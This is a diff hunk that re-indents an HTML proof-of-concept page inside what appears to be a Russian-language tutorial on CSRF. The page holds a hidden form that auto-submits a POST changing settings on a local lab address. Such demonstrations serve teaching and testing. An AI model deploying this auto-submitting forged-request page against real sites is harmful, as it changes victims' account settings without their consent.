@@ -56,19 +56,19 @@ GET-запросы не должны использоваться для вып�
   ``` <!DOCTYPE html> 
   <html lang="en"> 
   <head> 
-  <meta charset="UTF-8"> 
-  <title>CSRF</title> 
+    <meta charset="UTF-8"> 
+    <title>CSRF</title> 
   </head> 
   <body> 
  
   <br> 
   <p> 
-  <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
-  <p><input type=hidden value="false" name=settings> 
+    <form name="csrf_try" action="http://192.168.99.100:1337/change_settings_2" method="POST"> 
+      <p><input type=hidden value="false" name=settings> 
   </form> 
   </p> 
-  <script type="text/javascript"> 
-  document.csrf_try.submit(); 
+    <script type="text/javascript"> 
+    document.csrf_try.submit(); 
   </script>  
   </body> 
   </html>
